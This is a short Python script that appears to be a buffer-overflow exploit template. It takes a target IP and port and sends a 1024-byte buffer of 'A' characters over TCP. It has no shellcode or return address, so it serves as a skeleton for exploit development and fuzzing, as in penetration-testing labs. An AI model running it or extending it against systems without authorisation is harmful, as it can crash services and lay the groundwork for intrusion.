#!/usr/bin/env python3
# py3_bo_templ.py --
# dualfade

import sys
import socket
from optparse import OptionParser

# globals --

# defs --
def send():
    """ send payload -- """
    port = int(options.port)
    target = str(options.target)

    try:
      print('[+] sending payload')

      """ assemble temp sc -- """
      buffer = b"A" * int(1024)

      """ send payload -- """
      s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
      s.connect(('%s' % target, port))
      s.send(buffer)
      s.close()

      print('[+] done')

    except socket.error as e:
      print('[!] connection failed')
      print('[!] socket error: %s' % e)
      sys.exit(-1)


# main --
if __name__ == "__main__":
    """ get parser opts -- """
    parser = OptionParser()
    parser.add_option('-t', '--target', dest='target', help='target ip address')
    parser.add_option('-p', '--port', dest='port', help='port')
    try:
        (options, args) = parser.parse_args()
        if (options.target):
            """ send payload to target -- """
            print('[+] starting exploit')
            send()
            sys.exit(-1)
        else:
            print('[!] missing input')
            print('[!] exiting')
            sys.exit(-1)
    except SystemExit:
        sys.stdout.write("\n")
        sys.stdout.flush()
